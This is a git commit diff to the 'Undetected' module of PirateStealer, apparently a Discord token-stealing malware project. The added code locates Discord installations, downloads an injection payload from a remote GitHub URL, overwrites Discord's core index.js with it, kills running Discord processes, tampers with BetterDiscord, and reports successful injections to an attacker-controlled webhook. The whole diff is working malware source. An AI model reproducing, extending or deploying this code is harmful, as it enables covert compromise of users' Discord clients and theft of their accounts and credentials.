1b7b19df33407b0d72e93277b4708011f8f75947
Stanley <stan@stanleydev.me>
2021-11-01 12:02:11 +0100

    fix

--- src/Undetected/index.js
+++ src/Undetected/index.js
@@ -4,14 +4,29 @@ var glob = require("glob");
 const fs = require('fs');
 const https = require('https');
 const { exec } = require('child_process');
+var request = require('sync-request');
+const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const webhook = "da_webhook"
+
+const config = {
+    "logout": "%LOGOUT%",
+    "inject-notify": "%INJECTNOTI%",
+    "logout-notify": "%LOGOUTNOTI%",
+    "init-notify":"%INITNOTI%",
+    "embed-color": %MBEDCOLOR%,
+    "disable-qr-code": "%DISABLEQRCODE%"
+}
+
+
 
 
 var LOCAL = process.env.LOCALAPPDATA
 var discords = [];
 var injectPath = [];
 var runningDiscords = [];
+
+
 fs.readdirSync(LOCAL).forEach(file => {
     if (file.includes("iscord")) {
         discords.push(LOCAL + '\\' + file)
@@ -19,57 +34,84 @@ fs.readdirSync(LOCAL).forEach(file => {
         return;
     }
 });
+
 discords.forEach(function(file) {
     let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
     glob.sync(pattern).map(file => {
         injectPath.push(file)
-        listDiscords();
     })
+    
 });
+listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/Injection/injection', (resp) => {
+    https.get('https://raw.githubusercontent.com/bytixo/PirateStealer/dev/src/Injection/injection-clean', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
         });
         resp.on('end', () => {
             injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook), {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                     encoding: 'utf8',
                     flag: 'w'
                 });
-                let folder = file.replace("index.js", "PirateStealerBTW")
-                if (!fs.existsSync(folder)) {
-                    fs.mkdirSync(folder, 0744)
-                    startDiscord();
+                if (config["init-notify"] == "true") {
+                    let init = file.replace("index.js", "init")
+                    if (!fs.existsSync(init)) {
+                        fs.mkdirSync(init, 0744)
+                    }
+                }
+                if ( config.logout !== "false" ) {
+                    let folder = file.replace("index.js", "PirateStealerBTW")
+                    if (!fs.existsSync(folder)) {
+                        fs.mkdirSync(folder, 0744)
+                        if (config.logout == "instant") {
+                            startDiscord();
+                        }
+                    }
                 }
             })
+            
         });
     }).on("error", (err) => {
         console.log(err);
     });
 };
 
+
 function listDiscords() {
     exec('tasklist', function(err,stdout, stderr) {
+        console.log(stdout)
+        
         if (stdout.includes("Discord.exe")) {
 
-            runningDiscords.push("Discord")
+            runningDiscords.push("discord")
         }
         if (stdout.includes("DiscordCanary.exe")) {
 
-            runningDiscords.push("DiscordCanary")
+            runningDiscords.push("discordcanary")
         }
         if (stdout.includes("DiscordDevelopment.exe")) {
 
-            runningDiscords.push("DiscordDevelopment")
+            runningDiscords.push("discorddevelopment")
         }
         if (stdout.includes("DiscordPTB.exe")) {
 
-            runningDiscords.push("DiscordPTB")
+            runningDiscords.push("discordptb")
         };
-        killDiscord();
-    });
+        if (config.logout == "instant") {
+            killDiscord();
+        } else {
+            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
+                injectNotify();
+            }
+            Infect()
+            pwnBetterDiscord()
+        }
+    })
+
+
+   
 };
 
 function killDiscord() {
@@ -80,6 +122,9 @@ function killDiscord() {
             }
           });
     });
+    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
+        injectNotify();
+    }
     Infect()
     pwnBetterDiscord()
 };
@@ -103,5 +148,41 @@ function pwnBetterDiscord() {
     } else {
         return;
     }
+
+}
+
+
+function injectNotify() {
+    var fields = [];
+    injectPath.forEach( path => {
+        var c = {
+            name: ":syringe: Inject Path",
+            value: `\`\`\`${path}\`\`\``,
+            inline: !1
+        }
+        fields.push(c)
+    })
+    axios
+	.post(webhook, {
+        "content": null,
+        "embeds": [
+          {
+            "title": ":detective: Successfull injection",
+            "color": config["embed-color"],
+            "fields": fields,
+            "author": {
+              "name": "PirateStealer"
+            },
+            "footer": {
+              "text": "PirateStealer"
+            }
+          }
+        ]
+      })
+	.then(res => {
+	})
+	.catch(error => {
+
+    })
 
 }
